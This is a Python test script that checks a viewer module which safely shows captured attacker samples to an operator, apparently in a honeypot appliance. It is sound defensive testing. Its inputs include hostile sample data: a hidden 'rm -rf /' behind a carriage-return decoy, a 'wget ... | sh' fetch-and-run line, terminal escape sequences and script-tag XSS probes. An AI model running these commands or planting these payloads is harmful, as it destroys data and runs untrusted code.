#!/usr/bin/env python3
"""Check that a sample cannot act on the operator reading it.

The loot viewer puts attacker-chosen bytes on the operator's screen, which is
the one place in this appliance where captured content is rendered rather than
merely stored. Three things stop that being a foothold: control characters are
rewritten here, the page inserts the result with textContent, and the CSP
forbids inline script. This asserts the first, which is the only one a change
to this file could break.

    python3 admin-dashboard/test_safeview.py
"""

import importlib.util
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("safeview", ROOT / "safeview.py")
safeview = importlib.util.module_from_spec(spec)
spec.loader.exec_module(safeview)

ESC = bytes([27])
BEL = bytes([7])
BACKSLASH = bytes([92])

FAILED = 0


def check(label, condition, detail=""):
    global FAILED
    print(("ok   " if condition else "FAIL ") + label
          + ("" if condition or not detail else f"  -- {detail}"))
    if not condition:
        FAILED += 1


print("-- escape sequences --")

# Sparse enough to stay on the text path, which is where defang() runs. A
# denser one goes to hex instead; both are covered, because "it was safe
# because it happened to be classified binary" is not the property wanted.
payload = (b"#!/bin/sh\n# normal looking comment line here\n"
           + ESC + b"[2Jecho hi\n")
result = safeview.view(payload)
check("stays on the text path", result["kind"] == "text", result["kind"])
check("no raw ESC survives", ESC.decode() not in result["content"])
check("ESC is shown as ^[", "^[" in result["content"],
      repr(result["content"][-24:]))

dense = ESC + b"[2J" + ESC + b"]0;title" + BEL + b"\n"
result = safeview.view(dense)
check("a control-dense file goes to hex", result["kind"] == "binary")
check("no raw ESC in the hex view", ESC.decode() not in result["content"])
check("hex view is pure ASCII", all(ord(c) < 0x80 for c in result["content"]))

print("\n-- the carriage-return overwrite --")

result = safeview.view(b"echo harmless\rrm -rf /\n")
check("lone CR does not survive", "\r" not in result["content"],
      repr(result["content"]))
check("the hidden half is visible", "rm -rf /" in result["content"])
check("the decoy half is still visible", "echo harmless" in result["content"])

print("\n-- what must NOT be mangled --")

result = safeview.view(b"#!/bin/sh\n\tcd /tmp || cd /var/run\n")
check("newlines survive", result["content"].count("\n") == 2)
check("tabs survive", "\t" in result["content"])

result = safeview.view(b"#!/bin/sh\n" + BACKSLASH + b"3B is the octal artefact\n")
check("backslashes are untouched", BACKSLASH.decode() in result["content"])

# Returned verbatim on purpose. It is the caller's job not to parse it, and
# quietly stripping markup here would corrupt the evidence being read.
result = safeview.view(b"<script>alert(1)</script>\n<img onerror=x>\n")
check("markup passes through as data", "<script>" in result["content"])
check("markup does not make it binary", result["kind"] == "text")

print("\n-- binary --")

elf = b"\x7fELF\x02\x01\x01\x00" + bytes(range(256))
result = safeview.view(elf)
check("ELF is binary", result["kind"] == "binary")
check("canonical hexdump layout",
      result["content"].startswith("00000000  7f 45 4c 46 02 01 01 00"),
      repr(result["content"][:34]))
check("ASCII column has no raw bytes",
      all(ord(c) < 0x80 for c in result["content"]))

check("a NUL forces binary",
      safeview.view(b"#!/bin/sh\necho hi\x00\n")["kind"] == "binary")
check("gzip is binary", safeview.view(b"\x1f\x8b\x08" + bytes(64))["kind"] == "binary")
check("a plain script is text",
      safeview.view(b"#!/bin/sh\nwget http://x/y -O- | sh\n")["kind"] == "text")

result = safeview.view(b"#!/bin/sh\n", force_hex=True)
check("force_hex overrides the sniff", result["kind"] == "binary")
check("force_hex is reported", result["forced"] is True)

print("\n-- truncation is reported, not hidden --")

result = safeview.view(b"A" * 100, total_size=999999)
check("truncated is set", result["truncated"] is True)
check("bytes_shown is what was read", result["bytes_shown"] == 100)
check("size is the size on disk", result["size"] == 999999)

result = safeview.view(b"A" * 100, total_size=100)
check("a whole file is not marked truncated", result["truncated"] is False)

print("\n-- degenerate input does not raise --")

for label, blob in [
    ("empty", b""),
    ("invalid utf-8", b"\xff\xfe\xfd\n"),
    ("every byte value", bytes(range(256))),
    ("high bytes only", b"\x80" * 64),
    ("one NUL", b"\x00"),
    ("a very long single line", b"A" * 300000),
]:
    try:
        safeview.view(blob, total_size=len(blob))
        survived = True
    except Exception as exc:                                    # noqa: BLE001
        survived = False
        print(f"     raised: {exc!r}")
    check(f"survives {label}", survived)

print(f"\n{FAILED} check(s) failed" if FAILED else "\nall checks passed")
sys.exit(1 if FAILED else 0)
